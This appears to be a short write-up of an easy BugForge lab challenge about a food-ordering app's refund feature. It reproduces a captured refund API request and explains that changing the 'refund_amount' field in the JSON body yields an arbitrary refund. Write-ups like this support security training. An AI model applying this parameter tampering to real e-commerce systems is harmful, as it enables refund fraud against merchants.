# Cheesy Does It

Level: Easy\
Points: 10\
Type: Daily Challenge

Lab Interface

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

After order is successfully delivered, we have an option to report a problem

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

And and option to reqest for refund

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Refund request looks like this<br>

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

```
POST /api/orders/2/refund HTTP/2
Host: lab-1772469577140-3j5sko.labs-app.bugforge.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJzdXNoaWwiLCJpYXQiOjE3NzI0Njk2MzR9.G9s6pB7mCddTrwMNjqGgurcogG0EuVl7vNsyOwa6AzY
Content-Length: 73
Origin: https://lab-1772469577140-3j5sko.labs-app.bugforge.io
Referer: https://lab-1772469577140-3j5sko.labs-app.bugforge.io/orders/2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: green
Priority: u=0
Te: trailers

{"issue_reason":"Order was cold","request_refund":true,"refund_amount":0}
```

We can edit the `refund_amount` and get refund amount as much as we want.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
